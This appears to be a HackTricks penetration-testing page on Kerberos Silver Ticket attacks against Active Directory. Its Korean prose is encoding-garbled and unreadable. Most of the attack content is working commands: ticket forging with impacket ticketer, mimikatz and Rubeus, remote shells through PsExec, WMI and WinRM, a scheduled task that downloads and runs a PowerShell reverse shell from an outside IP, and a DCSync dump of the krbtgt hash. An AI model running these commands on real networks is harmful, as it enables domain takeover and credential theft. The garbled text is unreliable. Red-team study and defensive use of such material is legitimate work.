# ì‹¤ë²„ í‹°ì¼“

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— PRì„ ì œì¶œ**í•˜ì„¸ìš”.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ìš°ë¦¬ëŠ” ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ í•„ìˆ˜_).

{% embed url="https://www.stmcyber.com/careers" %}

## ì‹¤ë²„ í‹°ì¼“

**ì‹¤ë²„ í‹°ì¼“(Silver Ticket)** ê³µê²©ì€ Active Directory (AD) í™˜ê²½ì—ì„œ ì„œë¹„ìŠ¤ í‹°ì¼“ì„ ì•…ìš©í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì€ ì»´í“¨í„° ê³„ì •ê³¼ ê°™ì€ ì„œë¹„ìŠ¤ ê³„ì •ì˜ NTLM í•´ì‹œë¥¼ íšë“í•˜ì—¬ í‹°ì¼“ ë°œê¸‰ ì„œë¹„ìŠ¤(TGS) í‹°ì¼“ì„ ìœ„ì¡°í•˜ëŠ” ë° ì˜ì¡´í•©ë‹ˆë‹¤. ì´ ìœ„ì¡°ëœ í‹°ì¼“ì„ ì‚¬ìš©í•˜ì—¬ ê³µê²©ìëŠ” ë„¤íŠ¸ì›Œí¬ì—ì„œ íŠ¹ì • ì„œë¹„ìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©°, ì¼ë°˜ì ìœ¼ë¡œ ê´€ë¦¬ ê¶Œí•œì„ ëª©í‘œë¡œ ë‹¤ë¥¸ ì‚¬ìš©ìë¥¼ ê°€ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í‹°ì¼“ ìœ„ì¡°ì—ëŠ” AES í‚¤ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë” ì•ˆì „í•˜ê³  ê°ì§€í•˜ê¸° ì–´ë µë‹¤ëŠ” ì ì´ ê°•ì¡°ë©ë‹ˆë‹¤.

í‹°ì¼“ ìƒì„±ì„ ìœ„í•´ ìš´ì˜ ì²´ì œì— ë”°ë¼ ë‹¤ë¥¸ ë„êµ¬ê°€ ì‚¬ìš©ë©ë‹ˆë‹¤:

### Linuxì—ì„œ
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windowsì—ì„œ
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS ì„œë¹„ìŠ¤ëŠ” í¬ìƒìì˜ íŒŒì¼ ì‹œìŠ¤í…œì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•œ ì¼ë°˜ì ì¸ ëŒ€ìƒìœ¼ë¡œ ê°•ì¡°ë˜ì§€ë§Œ, HOST ë° RPCSSì™€ ê°™ì€ ë‹¤ë¥¸ ì„œë¹„ìŠ¤ë„ ì‘ì—… ë° WMI ì¿¼ë¦¬ë¥¼ ìœ„í•´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì‚¬ìš© ê°€ëŠ¥í•œ ì„œë¹„ìŠ¤

| ì„œë¹„ìŠ¤ ìœ í˜•                                | ì„œë¹„ìŠ¤ ì‹¤ë²„ í‹°ì¼“                                                         |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell ì›ê²©                            | <p>HOST</p><p>HTTP</p><p>OSì— ë”°ë¼ ë‹¤ìŒë„ í¬í•¨ë©ë‹ˆë‹¤:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>ì¼ë¶€ ê²½ìš°ì—ëŠ” WINRMë§Œ ìš”ì²­í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p> |
| ì˜ˆì•½ëœ ì‘ì—…                               | HOST                                                                       |
| Windows íŒŒì¼ ê³µìœ , ë˜í•œ psexec              | CIFS                                                                       |
| LDAP ì‘ì—…, DCSync í¬í•¨                     | LDAP                                                                       |
| Windows ì›ê²© ì„œë²„ ê´€ë¦¬ ë„êµ¬                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| ê³¨ë“  í‹°ì¼“                                  | krbtgt                                                                     |

**Rubeus**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë‹¤ìŒ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì´ëŸ¬í•œ í‹°ì¼“ì„ **ìš”ì²­**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ì‹¤ë²„ í‹°ì¼“ ì´ë²¤íŠ¸ ID

* 4624: ê³„ì • ë¡œê·¸ì˜¨
* 4634: ê³„ì • ë¡œê·¸ì˜¤í”„
* 4672: ê´€ë¦¬ì ë¡œê·¸ì˜¨

## ì„œë¹„ìŠ¤ í‹°ì¼“ ë‚¨ìš©

ë‹¤ìŒ ì˜ˆì œì—ì„œëŠ” í‹°ì¼“ì„ ê´€ë¦¬ì ê³„ì •ì„ í‰ë‚´ë‚´ì–´ ê²€ìƒ‰í•œ ê²ƒìœ¼ë¡œ ê°€ì •í•©ë‹ˆë‹¤.

### CIFS

ì´ í‹°ì¼“ì„ ì‚¬ìš©í•˜ë©´ **SMB**ë¥¼ í†µí•´ `C$` ë° `ADMIN$` í´ë”ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìœ¼ë©° (ë…¸ì¶œë˜ì–´ ìˆëŠ” ê²½ìš°) ì›ê²© íŒŒì¼ ì‹œìŠ¤í…œì˜ ì¼ë¶€ë¡œ íŒŒì¼ì„ ë³µì‚¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ ìˆ˜í–‰í•˜ê¸°ë§Œ í•˜ë©´ ë©ë‹ˆë‹¤:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
í˜¸ìŠ¤íŠ¸ ë‚´ì—ì„œ ì‰˜ì„ íšë“í•˜ê±°ë‚˜ **psexec**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../ntlm/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
{% endcontent-ref %}

### í˜¸ìŠ¤íŠ¸

ì´ ê¶Œí•œì„ ê°€ì§€ë©´ ì›ê²© ì»´í“¨í„°ì—ì„œ ì˜ˆì•½ëœ ì‘ì—…ì„ ìƒì„±í•˜ê³  ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

ì´ëŸ¬í•œ í‹°ì¼“ì„ ì‚¬ìš©í•˜ì—¬ í”¼í•´ ì‹œìŠ¤í…œì—ì„œ WMIë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
ë‹¤ìŒ í˜ì´ì§€ì—ì„œ **wmiexecì— ëŒ€í•œ ìì„¸í•œ ì •ë³´**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### í˜¸ìŠ¤íŠ¸ + WSMAN (WINRM)

ì»´í“¨í„°ì— ëŒ€í•œ winrm ì•¡ì„¸ìŠ¤ë¥¼ í†µí•´ **ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìœ¼ë©° PowerShellì„ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
ì›ê²© í˜¸ìŠ¤íŠ¸ì— winrmì„ ì‚¬ìš©í•˜ì—¬ ì—°ê²°í•˜ëŠ” **ë” ë§ì€ ë°©ë²•**ì„ ì•Œì•„ë³´ë ¤ë©´ ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
ì›ê²© ì»´í“¨í„°ì—ì„œ ì•¡ì„¸ìŠ¤í•˜ë ¤ë©´ **winrmì´ í™œì„±í™”ë˜ì–´ ìˆê³  ìˆ˜ì‹  ëŒ€ê¸°**í•´ì•¼í•©ë‹ˆë‹¤.
{% endhint %}

### LDAP

ì´ ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ **DCSync**ë¥¼ ì‚¬ìš©í•˜ì—¬ DC ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë¤í”„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
## ì°¸ê³  ìë£Œ
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

**í•´í‚¹ ê²½ë ¥**ì— ê´€ì‹¬ì´ ìˆê³  í•´í‚¹í•  ìˆ˜ ì—†ëŠ” ê²ƒì„ í•´í‚¹í•˜ê³  ì‹¶ë‹¤ë©´ - **ì €í¬ê°€ ê³ ìš© ì¤‘ì…ë‹ˆë‹¤!** (_ìœ ì°½í•œ í´ë€ë“œì–´ ì‘ë¬¸ ë° êµ¬ì‚¬ ëŠ¥ë ¥ í•„ìš”_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”**.

</details>
